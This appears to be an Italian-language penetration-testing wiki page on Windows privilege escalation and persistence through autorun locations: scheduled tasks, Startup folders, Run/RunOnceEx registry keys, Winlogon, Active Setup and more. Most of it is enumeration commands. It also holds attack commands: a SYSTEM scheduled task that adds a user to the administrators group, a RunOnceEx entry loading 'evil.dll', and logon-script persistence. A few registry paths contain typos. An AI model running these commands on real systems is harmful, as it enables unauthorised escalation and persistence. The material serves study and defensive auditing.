# Privilege Escalation with Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** può essere usato per eseguire programmi all'**avvio**. Vedi quali binari sono programmati per essere eseguiti all'avvio con:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Attività pianificate

Le **Attività** possono essere pianificate per essere eseguite con una **certa frequenza**. Vedi quali binari sono pianificati per essere eseguiti con:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Cartelle

Tutti i binary situati nelle **Startup folders verranno eseguiti all'avvio**. Le common startup folders sono quelle elencate di seguito, ma la startup folder è indicata nel registry. [Leggi questo per sapere dove.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Le vulnerabilità di *path traversal* nell’estrazione di archivi (come quella sfruttata in WinRAR prima della 7.13 – CVE-2025-8088) possono essere usate per **depositare payload direttamente dentro queste cartelle Startup durante la decompressione**, con conseguente esecuzione di codice al successivo logon dell’utente. Per un approfondimento su questa tecnica vedi:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): La voce di registro **Wow6432Node** indica che stai eseguendo una versione a 64-bit di Windows. Il sistema operativo usa questa chiave per mostrare una vista separata di HKEY_LOCAL_MACHINE\SOFTWARE per le applicazioni a 32-bit che girano su versioni a 64-bit di Windows.

### Runs

**Comuni** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Le chiavi di registro note come **Run** e **RunOnce** sono progettate per eseguire automaticamente programmi ogni volta che un utente effettua il login al sistema. La command line assegnata come valore dati di una chiave è limitata a 260 caratteri o meno.

**Service runs** (possono controllare l’avvio automatico dei servizi durante il boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Su Windows Vista e versioni successive, le chiavi di registro **Run** e **RunOnce** non vengono generate automaticamente. Le voci in queste chiavi possono sia avviare direttamente i programmi sia specificarli come dipendenze. Per esempio, per caricare un file DLL al logon, si può usare la chiave di registro **RunOnceEx** insieme a una chiave "Depend". Questo è dimostrato aggiungendo una voce di registro per eseguire "C:\temp\evil.dll" durante l’avvio del sistema:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Se puoi scrivere all'interno di uno dei registry menzionati dentro **HKLM** puoi elevare i privilegi quando un altro utente effettua il login.

> [!TIP]
> **Exploit 2**: Se puoi sovrascrivere uno dei binaries indicati in uno qualsiasi dei registry dentro **HKLM** puoi modificare quel binary con una backdoor quando un altro utente effettua il login ed elevare i privilegi.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

I collegamenti inseriti nella cartella **Startup** attiveranno automaticamente servizi o applicazioni da avviare durante il logon dell'utente o il riavvio del sistema. La posizione della cartella **Startup** è definita nel registro sia per l'ambito **Local Machine** sia per **Current User**. Questo significa che qualsiasi collegamento aggiunto a queste posizioni **Startup** specificate farà sì che il servizio o programma collegato si avvii dopo il processo di logon o reboot, rendendolo un metodo semplice per pianificare l'esecuzione automatica dei programmi.

> [!TIP]
> Se puoi sovrascrivere qualsiasi \[User] Shell Folder sotto **HKLM**, potrai puntarlo a una cartella controllata da te e inserire una backdoor che verrà eseguita ogni volta che un utente effettua il login nel sistema, escalating privileges.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Questo valore di registro per singolo utente può puntare a uno script o comando che viene eseguito quando quell'utente effettua il logon. È principalmente una primitive di **persistence** perché viene eseguito solo nel contesto dell'utente interessato, ma vale comunque la pena verificarlo durante il post-exploitation e le review degli autoruns.

> [!TIP]
> Se puoi scrivere questo valore per l'utente corrente, puoi riattivare l'esecuzione al prossimo logon interattivo senza bisogno di privilegi admin. Se puoi scriverlo per l'hive di un altro utente, potresti ottenere code execution quando quell'utente effettua il logon.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notes:

- Preferisci percorsi completi verso file `.bat`, `.cmd`, `.ps1`, o altri launcher file già leggibili dall'utente target.
- Questo sopravvive a logoff/reboot finché il valore non viene rimosso.
- A differenza di `HKLM\...\Run`, questo non concede da solo l'elevazione; è persistence a livello utente.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Tipicamente, la chiave **Userinit** è impostata su **userinit.exe**. Tuttavia, se questa chiave viene modificata, l'eseguibile specificato verrà anch'esso avviato da **Winlogon** al logon dell'utente. Allo stesso modo, la chiave **Shell** è destinata a puntare a **explorer.exe**, che è la shell predefinita per Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Se puoi sovrascrivere il valore del registry o il binario, sarai in grado di elevare i privilegi.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Controlla la chiave **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Cambiare il Command Prompt di Safe Mode

Nel Windows Registry sotto `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, c'è un valore **`AlternateShell`** impostato di default su `cmd.exe`. Questo significa che quando scegli "Safe Mode with Command Prompt" durante l'avvio (premendo F8), viene usato `cmd.exe`. Però, è possibile configurare il computer per avviarsi automaticamente in questa modalità senza dover premere F8 e selezionarla manualmente.

Passi per creare un boot option per avviare automaticamente in "Safe Mode with Command Prompt":

1. Cambia gli attributi del file `boot.ini` per rimuovere i flag read-only, system e hidden: `attrib c:\boot.ini -r -s -h`
2. Apri `boot.ini` per modificarlo.
3. Inserisci una riga come: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Salva le modifiche a `boot.ini`.
5. Reimposta gli attributi originali del file: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Cambiare la chiave di registry **AlternateShell** permette di configurare una command shell personalizzata, potenzialmente per accesso non autorizzato.
- **Exploit 2 (PATH Write Permissions):** Avere permessi di scrittura su qualsiasi parte della variabile di sistema **PATH**, soprattutto prima di `C:\Windows\system32`, permette di eseguire un `cmd.exe` personalizzato, che potrebbe essere una backdoor se il sistema viene avviato in Safe Mode.
- **Exploit 3 (PATH and boot.ini Write Permissions):** L'accesso in scrittura a `boot.ini` abilita l'avvio automatico in Safe Mode, facilitando l'accesso non autorizzato al successivo riavvio.

Per controllare l'impostazione corrente di **AlternateShell**, usa questi comandi:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup è una funzionalità in Windows che **si avvia prima che l'ambiente desktop sia completamente caricato**. Dà priorità all'esecuzione di determinati comandi, che devono terminare prima che il logon dell'utente prosegua. Questo processo avviene persino prima che vengano attivate altre voci di startup, come quelle presenti nelle sezioni del registro Run o RunOnce.

Active Setup è gestito tramite le seguenti chiavi di registro:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

All'interno di queste chiavi esistono varie sottochiavi, ciascuna corrispondente a un componente specifico. I valori chiave di particolare interesse includono:

- **IsInstalled:**
- `0` indica che il comando del componente non verrà eseguito.
- `1` significa che il comando verrà eseguito una volta per ogni utente, che è il comportamento predefinito se il valore `IsInstalled` manca.
- **StubPath:** Definisce il comando da eseguire tramite Active Setup. Può essere qualsiasi command line valida, come l'avvio di `notepad`.

**Security Insights:**

- Modificare o scrivere in una chiave in cui **`IsInstalled`** è impostato su `"1"` con uno specifico **`StubPath`** può portare all'esecuzione non autorizzata di comandi, potenzialmente per privilege escalation.
- Alterare il file binario referenziato in qualsiasi valore **`StubPath`** potrebbe anche consentire privilege escalation, se si dispongono dei permessi sufficienti.

Per ispezionare le configurazioni **`StubPath`** tra i componenti Active Setup, si possono usare questi comandi:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Overview of Browser Helper Objects (BHOs)

I Browser Helper Objects (BHOs) sono moduli DLL che aggiungono funzionalità extra a Microsoft Internet Explorer. Si caricano in Internet Explorer e Windows Explorer a ogni avvio. Tuttavia, la loro esecuzione può essere bloccata impostando la chiave **NoExplorer** a 1, impedendo il caricamento con le istanze di Windows Explorer.

I BHOs sono compatibili con Windows 10 tramite Internet Explorer 11 ma non sono supportati in Microsoft Edge, il browser predefinito nelle versioni più recenti di Windows.

Per esplorare i BHOs registrati su un sistema, puoi ispezionare le seguenti chiavi di registro:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Ogni BHO è rappresentato dal proprio **CLSID** nel registro, che funge da identificatore univoco. Informazioni dettagliate su ciascun CLSID possono essere trovate in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Per interrogare i BHOs nel registro, si possono usare questi comandi:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Nota che il registry conterrà 1 nuovo registry per ogni dll e sarà rappresentato dal **CLSID**. Puoi trovare le informazioni del CLSID in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opzioni di esecuzione dei file immagine
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Nota che tutti i siti in cui puoi trovare gli autoruns sono **già cercati da**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Tuttavia, per un **elenco più completo di file auto-eseguiti** puoi usare [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)da systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Altro

**Trova altre chiavi di Autoruns come registries in** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Riferimenti

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
